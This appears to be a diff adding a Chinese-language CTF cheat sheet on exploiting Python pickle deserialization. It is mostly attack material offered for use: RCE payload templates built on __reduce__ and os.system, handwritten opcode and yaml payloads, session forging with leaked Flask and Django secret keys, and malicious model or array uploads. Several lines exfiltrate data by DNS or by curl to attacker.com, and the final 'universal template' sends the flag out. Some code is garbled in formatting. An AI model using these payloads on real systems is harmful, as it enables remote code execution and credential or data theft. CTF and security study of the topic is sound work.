@@ -1,0 +1,91 @@
+Pickle 专项知识库
+
+【0】核心机制理解（必须掌握） Pickle = Python 字节码解释器
+pickle.loads(data) 会执行 data 中 opcode 指令，而不是简单恢复对象 Pickle
+反序列化 = 任意代码执行解释器
+
+【1】Pickle 执行触发点（入口识别） 常见危险函数： pickle.loads()
+pickle.load() cPickle.loads() dill.loads() joblib.load() torch.load()
+pandas.read_pickle() numpy.load(…allow_pickle=True)
+
+【2】典型漏洞示例： data = request.cookies.get(“session”)
+pickle.loads(base64.b64decode(data))
+
+【3】Pickle 数据格式识别特征 原始： base64：gASV 快速判断口诀： gASV ≈
+Pickle rO0 ≈ Java Tzo ≈ PHP
+
+【4】Pickle RCE 基础 Payload 模板 示例： import pickle, os, base64
+class Exploit: def reduce(self): return (os.system, (“cat /flag”,))
+payload = base64.b64encode(pickle.dumps(Exploit()))
+print(payload.decode())
+执行逻辑： pickle.loads(payload) → 调用 reduce → 执行 os.system(“cat
+/flag”)
+
+【5】reduce 执行机制原理 格式： (callable, args)
+解释器执行： callable(*args)
+
+示例： return (eval, (“import(‘os’).system(‘id’)”,))
+
+【6】无回显场景 Payload DNS 外带： nslookup cat /flag|base64.dnslog.cn
+HTTP 外带： curl http://attacker.com/?cat /flag|base64
+写 Webshell： echo ‘’ > shell.php
+时间盲注： sleep 5
+
+【7】绕过 reduce 过滤（手写 opcode） payload 示例： cos system (S’id’
+tR.
+解释： c → import S → string t → tuple R → execute . → stop
+执行效果： os.system(“id”)
+
+【8】Pickle opcode 常用指令 c = import module R = execute callable S =
+string t = tuple ( = mark . = stop
+核心结构： c module function (args) R
+
+【9】Pickle 沙箱绕过技巧 替代执行函数： subprocess.Popen eval import
+示例： return (eval, (“import(‘os’).system(‘id’)”,))
+
+【10】无 import 情况利用 可用： builtins.eval getattr(builtins,‘eval’)
+
+【11】Flask Session Pickle 利用 条件： secret_key 泄露
+工具： flask-unsign
+示例： flask-unsign –sign –cookie “{‘admin’:True}” –secret “secret_key”
+
+【12】Redis Pickle Session 利用 典型流程： redis.get(session_id)
+pickle.loads(data)
+攻击方式： SSRF Redis 未授权访问 缓存投毒
+
+【13】Django Pickle 利用 危险函数： django.core.signing.loads()
+条件： SECRET_KEY 泄露
+攻击方式： 伪造 session cookie
+
+【14】numpy.load Pickle 利用 危险代码： numpy.load(file,
+allow_pickle=True)
+攻击方式： 上传 payload.npy
+
+【15】PyTorch 反序列化漏洞 危险函数： torch.load(model)
+
+攻击方式： 上传 evil.pt
+
+【16】yaml.load 间接 Pickle 利用 payload 示例：
+!!python/object/apply:os.system - id
+
+执行效果： os.system(“id”)
+
+【17】Pickle 调试工具 反编译： import pickletools
+pickletools.dis(payload)
+
+作用： 分析执行路径 调试 payload
+
+【18】Pickle 标准攻击流程（CTF SOP） 1 识别 gASV 2 确认 pickle.loads 3
+sleep 测试 4 DNS 外带 5 读取 flag
+
+【19】CTF 高频 Flag 路径 /flag /flag.txt /app/flag /root/flag
+/proc/self/environ
+
+备用： find / -name flag* 2>/dev/null
+
+【20】比赛万能模板 import pickle import base64 import os
+
+class P: def reduce(self): return (os.system, (“curl
+http://attacker.com/?cat /flag|base64”,))
+
+print(base64.b64encode(pickle.dumps(P())).decode())
